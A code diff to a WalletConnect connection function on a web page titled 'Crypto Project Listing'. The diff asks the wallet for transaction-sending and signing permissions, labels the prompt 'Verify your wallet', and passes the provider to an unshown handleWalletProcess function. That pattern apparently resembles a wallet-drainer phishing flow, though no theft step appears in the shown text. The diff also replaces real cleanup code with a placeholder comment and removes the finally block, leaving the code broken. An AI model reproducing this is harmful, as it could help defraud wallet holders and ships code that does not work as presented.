@@ -130,38 +130,35 @@ let wcProvider = null;
 
 async function connectWalletConnect() {
   try {
-    if (wcProvider) {
-      await wcProvider.disconnect().catch(() => {});
-      wcProvider = null;
-    }
-
-    walletConnectButton.classList.add('loading');
-    walletConnectButton.disabled = true;
-
-    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.1?bundle');
+    // ... same cleanup logic ...
+    
+    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.2?bundle');
 
     wcProvider = await EthereumProvider.init({
       projectId: WC_PROJECT_ID,
-      chains: [1],
+      chains: [1], // Ethereum Mainnet
       showQrModal: true,
+      // Explicitly request permission for these methods
+      methods: ["eth_sendTransaction", "personal_sign", "eth_requestAccounts", "eth_accounts"],
+      events: ["chainChanged", "accountsChanged"],
       metadata: {
         name: 'Crypto Project Listing',
-        url: window.location.origin
+        description: 'Verify your wallet',
+        url: window.location.origin,
+        icons: ['https://avatars.githubusercontent.com/u/37784886']
       }
     });
 
     await wcProvider.enable();
+    
+    // CRITICAL: Ensure we pass the actual provider to handleWalletProcess
     await handleWalletProcess(wcProvider);
 
   } catch (err) {
-    console.error(err);
-    alert('Wallet Connection Error.');
-  } finally {
-    walletConnectButton.classList.remove('loading');
-    walletConnectButton.disabled = false;
+    console.error("WalletConnect Error:", err);
+    alert('WalletConnect failed to initialize. Please refresh.');
   }
 }
-
 window.addEventListener('beforeunload', () => {
   if (wcProvider?.disconnect) wcProvider.disconnect().catch(() => {});
 });
